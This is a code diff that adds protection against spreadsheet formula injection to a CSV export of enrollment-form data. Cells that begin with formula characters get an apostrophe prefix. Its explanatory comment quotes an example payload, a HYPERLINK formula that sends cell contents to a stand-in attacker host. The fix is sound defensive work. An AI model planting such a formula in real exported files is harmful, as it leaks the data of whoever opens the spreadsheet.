@@ -41,7 +41,27 @@ function csvCell(value: unknown): string {
     : String(value);
   // Quote every cell and escape embedded quotes — simplest way to stay correct
   // for free-text fields (bios, notes) that can contain commas, quotes, and newlines.
-  return `"${str.replace(/"/g, '""')}"`;
+  return `"${neutralizeFormula(str).replace(/"/g, '""')}"`;
+}
+
+/**
+ * Stops a spreadsheet from treating an applicant's text as a formula.
+ *
+ * Every cell here is free text typed into the public enrollment form, and this
+ * file exists to be opened in Excel / Google Sheets. A bio or "additional
+ * notes" beginning with `=`, `+`, `-`, `@` is parsed as a formula on open, so a
+ * value like `=HYPERLINK("https://evil.example?"&A1,"Click")` runs in the
+ * client's spreadsheet with her data. Quoting does not prevent this — Excel
+ * evaluates `"=..."` just the same — so the leading character has to be
+ * defused.
+ *
+ * A leading apostrophe is the standard fix: spreadsheets read it as "treat the
+ * rest as literal text" and don't display it. Tab and carriage return are
+ * included because they're stripped during parsing, which would otherwise
+ * expose the character behind them.
+ */
+function neutralizeFormula(str: string): string {
+  return /^[=+\-@\t\r]/.test(str) ? `'${str}` : str;
 }
 
 export async function GET(request: NextRequest) {
